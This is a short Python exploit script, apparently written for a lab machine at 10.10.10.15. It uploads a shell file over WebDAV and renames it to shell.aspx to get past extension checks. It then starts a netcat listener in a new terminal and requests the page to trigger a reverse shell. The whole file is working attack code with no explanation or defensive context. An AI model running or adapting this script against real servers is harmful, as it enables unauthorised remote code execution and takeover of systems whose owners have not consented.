#!/usr/bin/python3                                                        
  
import requests
from webdav3.client import Client
from subprocess import Popen


ip = '10.10.10.15'
shell = 'shell.txt'
lport = '443'

options = {
 'webdav_hostname': "http://"+ip
}
client = Client(options)
client.upload(remote_path=shell, local_path=shell)

client.move(remote_path_from=shell, remote_path_to="shell.aspx")
cmd = "terminator -T \'Catch the Shell\' -e \'nc -nvl "+ lport+'\''
Popen(cmd ,shell=True)

callbackurl = 'http://'+ip+'/'+"shell.aspx"
r2 = requests.get(callbackurl)

